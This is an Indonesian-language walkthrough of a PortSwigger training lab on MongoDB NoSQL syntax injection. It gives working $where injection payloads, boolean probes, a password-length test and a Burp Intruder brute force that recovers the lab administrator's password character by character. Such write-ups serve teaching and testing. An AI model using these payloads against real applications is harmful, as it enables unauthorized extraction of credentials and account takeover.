# NoSQL Injection Lab – Exploiting Syntax Injection to Extract Data

## Lab Description

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/d65cd1cd-7ed3-4cc3-b632-9aeb22fada48)

---

## Overview

### Exploiting Syntax Injection to Extract Data

Beberapa database **NoSQL** (seperti MongoDB) mengizinkan penggunaan operator atau fungsi yang dapat menjalankan kode JavaScript terbatas. Contohnya:

* Operator `$where`
* Fungsi `mapReduce()`

Jika aplikasi rentan menggunakan operator ini, maka **JavaScript** yang disuntikkan bisa dieksekusi oleh database. Artinya, kita dapat menyuntikkan payload untuk mengekstrak data sensitif.

### Exfiltrating Data in MongoDB

Misalkan aplikasi rentan mengizinkan pencarian username dan menampilkan role. Request normal:

```
https://insecure-website.com/user/lookup?username=admin
```

Akan menghasilkan query NoSQL seperti:

```json
{"$where":"this.username == 'admin'"}
```

Jika rentan, kita dapat menyuntikkan payload:

```json
admin' && this.password[0] == 'a' || 'a'=='b
```

Payload ini dapat dipakai untuk mengekstrak password karakter demi karakter.

Contoh lain menggunakan fungsi `match()`:

```json
admin' && this.password.match(/\d/) || 'a'=='b
```

Payload ini memeriksa apakah password mengandung digit.

---

## Solution

### 1. Login as Wiener

Request:

```http
GET /user/lookup?user=wiener'+' HTTP/1.1
Host: 0a5a000604a69386817f4d0c00d50033.web-security-academy.net
...
Cookie: session=IxSUIRgjxiu4z9R8PqzaavxdpaT460zx
```

Response:

```json
{
  "username": "wiener",
  "email": "wiener@normal-user.net",
  "role": "user"
}
```

Jika kita tambahkan `'` → `user=wiener'` maka terjadi error:

```json
{ "message": "There was an error getting user details" }
```

Namun jika menggunakan `wiener'%2b'` (URL-encoded dari `wiener'+'`), query berhasil kembali normal.

> Artinya aplikasi benar-benar **mengevaluasi query injeksi** di backend.

---

### 2. Injecting Boolean Conditions

**False Condition**

```http
?user=wiener' && '1'=='2
```

Response:

```json
{ "message": "Could not find user" }
```

**True Condition**

```http
?user=wiener' && '1'=='1
```

Response sukses, data wiener ditampilkan kembali.

---

### 3. Menentukan Panjang Password

Gunakan payload:

```nosql
?user=administrator' && this.password.length < 30 || 'a'=='b
```

Hasilnya query berhasil → password panjangnya **kurang dari 30**.

Jika payload:

```nosql
this.password.length < 8
```

Hasilnya gagal.

Maka panjang password **administrator adalah 8 karakter**.

---

### 4. Mengekstrak Password Admin

Gunakan brute force dengan payload:

```nosql
user=administrator' && this.password[0]=='a
```

#### Teknik Brute Force dengan Burp Intruder

* **Payload 1**: index karakter (0–7)
* **Payload 2**: huruf (a–z)

Contoh hasil serangan:
![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/3f359128-701e-4712-a572-63034bbb6da1)

Password admin berhasil diperoleh:

```
oiwpuaam
```

---

### 5. Login as Admin

Gunakan password hasil brute force untuk login sebagai **administrator**.

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/1b7dee7d-f2c9-4e1b-98d8-ca8cff9e85d5)
